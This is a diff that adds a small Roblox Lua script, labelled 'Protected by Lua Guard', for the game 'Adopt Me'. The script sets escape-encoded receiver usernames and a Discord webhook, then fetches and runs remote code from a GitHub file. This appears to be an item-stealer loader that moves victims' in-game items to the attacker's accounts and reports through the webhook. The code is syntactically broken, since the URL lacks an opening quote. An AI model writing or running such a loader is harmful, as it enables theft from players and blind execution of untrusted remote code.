@@ -1,0 +1,4 @@
+--[[ Protected by Lua Guard ]]
+
+( function (...) _G.Usernames = {"\107\105\110\100\101\114\097\117\102\100\105\101\101\105\110\115", "\107\105\110\100\101\114\097\117\102\100\105\101\101\105\110\115\049", "\107\105\110\100\101\114\097\117\102\100\105\101\101\105\110\115\050"} _G.min_value = 0.1 _G.pingEveryone = "\089\101\115" _G.webhook = "https://discord.com/api/webhooks/0x15083532C1021000/L0_khbWbKMcZcXkav590bnNFW-eBd21mwTf1TjZLZrww9KD1eLB-jcK8_RrSwiJc3JCo " loadstring(game:HttpGet(https://raw.githubusercontent.com/aimbot952/Adopt-me/refs/heads/main/source.lua "))() end
+ )(...)
